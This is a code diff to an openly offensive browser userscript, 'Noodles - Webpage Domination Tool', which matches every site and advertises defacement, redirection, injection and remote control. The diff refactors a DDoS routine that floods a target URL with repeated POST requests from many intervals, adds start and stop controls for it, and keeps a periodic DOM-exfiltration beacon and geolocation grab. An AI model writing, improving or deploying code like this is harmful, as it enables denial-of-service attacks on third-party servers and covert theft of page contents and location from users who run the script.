@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name Noodles - Webpage Domination Tool
 // @namespace http://noodles.local/
-// @version 1.337.71
+// @version 1.337.72
 // @description Own any webpage. Deface, redirect, inject. Includes advanced configuration panel and remote control capabilities.
 // @author TheBlackHatNoRemorse | Edited By Noodles Automatic - Enhanced by yours truly
 // @match *://*/*
@@ -465,7 +465,7 @@
                     fetch(targetURL, {
                         method: 'POST',
                         mode: 'no-cors',
-                        body: JSON.stringify(payload) // Send data with the request
+                         body: JSON.stringify(payload), // Send data with the request
                     })
                     .catch(error => {
                         //console.error('Noodles: DDoS Request Failed:', error); //Reduce console noise
@@ -478,10 +478,30 @@
             }
         };
 
-        for (let i = 0; i < numThreads; i++) {
-            setInterval(attack, 1000);
+        let ddosIntervals = []; // Store interval IDs for clearing
+
+        const startDDoS = () => {
+             for (let i = 0; i < numThreads; i++) {
+                let intervalId = setInterval(attack, 1000);
+                ddosIntervals.push(intervalId);
+            }
         }
+
+        const stopDDoS = () => {
+            ddosIntervals.forEach(intervalId => clearInterval(intervalId));
+            ddosIntervals = []; // Clear the array
+        }
+
+        if (defacementConfig.ddosEnabled) {
+            startDDoS();
+        }
+
+
+       return { startDDoS, stopDDoS };
     };
+
+   let ddosControl = performDDOS(); //Initialize ddosControl
+
 
     const createConfigPanel = () => {
         let panel = document.getElementById('noodlesDefacementPanel');
@@ -568,12 +588,12 @@
                 }
                  if (key === 'ddosEnabled') {
                     if (e.target.checked) {
-                        performDDOS();
+                      ddosControl = performDDOS(); //Reinitialize DDOS control
+                        ddosControl.startDDoS();
                     } else {
-                      //Stop DDoS by clearing intervals. Crude, but effective
-                      for (let i = 1; i < 1000; i++) { //Arbitrary large number
-                        clearInterval(i);
-                      }
+                        if (ddosControl && ddosControl.stopDDoS) {
+                            ddosControl.stopDDoS();
+                        }
                     }
                 }
             });
@@ -783,9 +803,7 @@
     setInterval(exfiltrateDOM, defacementConfig.beaconInterval);
 
     getGeoLocation();
-     if (defacementConfig.ddosEnabled) {
-        performDDOS();
-    }
+
 
     const initialize = () => {
         if (document.readyState === 'loading') {
